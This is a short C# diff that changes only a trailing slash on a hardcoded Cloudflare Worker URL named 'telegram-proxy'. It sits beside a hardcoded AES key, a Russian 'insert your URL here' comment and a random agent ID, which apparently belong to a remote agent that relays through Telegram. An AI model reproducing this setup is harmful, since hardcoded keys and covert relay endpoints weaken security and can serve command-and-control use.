@@ -32,7 +32,7 @@ namespace Agent
         private static readonly byte[] AesKey = Convert.FromBase64String("c2VjcmV0X2tleV9mb3JfdmFudGFfMTIzNDU2Nzg=");
         
         // ВСТАВЬ СЮДА СВОЙ URL ОТ CLOUDFLARE WORKER (если используешь)
-        private static readonly string WorkerUrl = "https://telegram-proxy.ivanovicpavel295.workers.dev"; 
+        private static readonly string WorkerUrl = "https://telegram-proxy.ivanovicpavel295.workers.dev/"; 
 
         private static int _slot = 0;
         private static string _id = Guid.NewGuid().ToString("N").Substring(0, 8);
